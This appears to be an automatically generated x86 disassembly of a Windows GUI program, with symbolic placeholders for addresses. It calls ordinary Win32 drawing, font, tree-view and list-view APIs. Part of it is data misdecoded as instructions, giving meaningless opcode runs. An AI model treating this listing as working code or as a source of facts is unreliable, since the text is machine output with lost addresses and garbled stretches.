ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_426848
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ad28
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41ad28
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41ad28
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41ad28
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41ad28
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41ad28
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_4252cc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41ad28
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_4255f0
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_428910
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_4278f0
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_426894
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42898a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_426ef8
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4289b0
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4289f8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425fc4
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_4266c0
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_428a4c
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_4266c4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_418b44
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_428a7c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_428d54
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_4266c0
mov eax [ esi + 0x28 ]
call sub_4266c4
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_418b70
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_428adc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_424b44
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_428b34
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_428b70
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41aae4
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41acf0
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_42589c
jmp r-xdata
jmp r-xdata
call sub_424d54
sub_428be8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428c75
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_428b34
cmp eax [ rw-data ]
jne r-xdata
call sub_424d54
mov eax esi
call sub_428b34
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425dc8
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402b80
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41ad28
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_428c9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428d2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41aac4
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41acf0
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41acf0
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_428d54
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_424d54
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428d2f
mov eax [ ebp - 0x4 ]
call sub_403174
call sub_403950
call sub_4039a4
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_428d54
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_428d94
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4266c0
mov eax [ ebx + 0x28 ]
call sub_4266c4
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428e14
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_428be8
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41ad28
pop esi
pop ebx
retn
sub_428e64
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_42539c
mov [ rw-data ] eax
pop ebx
retn
sub_428e9c
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_428ee0
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_428e9c
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_428fac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_428fe4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax esi
call sub_4291dc
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_429028
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429010
xor eax eax
push ebp
push sub_4290c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290d0
mov eax [ ebp - 0x4 ]
call sub_42901c
retn
mov eax 0x10
call sub_4026f4
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4290dc
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4290dc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427168
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4291bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_427730
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_42432c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424210
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_416c50
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_4245fc
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424a28
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_4273ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4291dc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429010
xor eax eax
push ebp
push sub_429227
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42922e
mov eax [ ebp - 0x4 ]
call sub_42901c
retn
mov esp ebp
pop ebp
retn
sub_42922e
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_402714
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403174
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429010
xor eax eax
push ebp
push sub_429227
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42922e
mov eax [ ebp - 0x4 ]
call sub_42901c
retn
mov esp ebp
pop ebp
retn
sub_429254
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423584
push eax
mov eax ebx
call sub_423584
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_429028
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_42928c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429355
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42935c
retn
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
call sub_4263a4
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
call sub_403174
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404968
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404968
sub_429360
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_428e64
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_428ee0
mov cx 0x2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d3c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d3c
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ r-xdata ]
call sub_422d3c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_428fac
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187e0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4187e0
mov [ rw-data ] eax
mov ecx sub_423594
mov edx sub_4235a4
mov eax [ sub_422004 ]
call sub_417a68
mov ecx r-xdata
mov edx sub_4237ac
mov eax [ r-xdata ]
call sub_417a68
sub_42946c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429491
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429498
retn
sub_4294a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x140042 ] dl
add [ eax ] al
adc al 0x5b
inc ecx
add [ ebx + esi + 0x33b00040 ] ah
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
sub al 0x81
inc ecx
add al dl
add [ ecx ] 0x2c
xchg esi eax
inc edx
add [ eax - 0x3ffbe7f ] al
add [ ecx ] 0x624f540b
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
pop eax
xchg ebp eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edx * 4 + 0x42 ] ah
add [ eax ] cl
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
mov ah 0x96
inc edx
add [ eax - 0x7ffbfd7 ] ch
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
push esp
push ebx
je r-xdata
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
dec esp
imul esi [ ebx + 0x74 ] 0xc000408d
xchg ebp eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
xchg ebp eax
inc edx
add [ eax ] cl
add [ eax ] al
add [ edx * 4 + 0x33a40042 ] cl
inc eax
add [ eax - 0x4bffbfcd ] dh
xor eax [ eax ]
mov eax 0xac004033
xor eax [ eax ]
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
mov ah 0x96
inc edx
add [ eax ] bl
xchg edi eax
inc edx
add al bh
xchg esi eax
inc edx
add ah ah
xchg esi eax
inc edx
add [ esi ] al
mov ecx ebx
mov edx edi
mov eax esi
call sub_418510
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403174
sub_4295d4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_42962c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418510
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403174
sub_429670
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403144
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_4296b4
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_4296f8
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418198
mov eax esi
pop esi
pop ebx
retn
sub_429724
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429749
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429750
retn
sub_429764
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_4297c4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_429764
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_4298b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429940
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1102
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42995c
push ebp
mov ebp esp
push ebx
push esi
mov ebx ecx
mov esi eax
mov [ ebx ] edx
push ebx
mov eax [ ebp + 0x8 ]
push eax
push 0x1104
push esi
call SendMessageA
pop esi
pop ebx
pop ebp
retn 0x4
sub_4299b8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1109
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_4299d4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x110a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429a74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x110b
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429b28
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push esi
push edi
push 0x1115
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429bd4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x100a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429c00
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1012
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_429c2c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429c51
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429c58
retn
sub_429c64
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_429d23
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429d2a
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4043ac
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_429c64
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_403eec
sub_429d4c
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_429c64
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_429dd4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_429c64
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_429e64
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
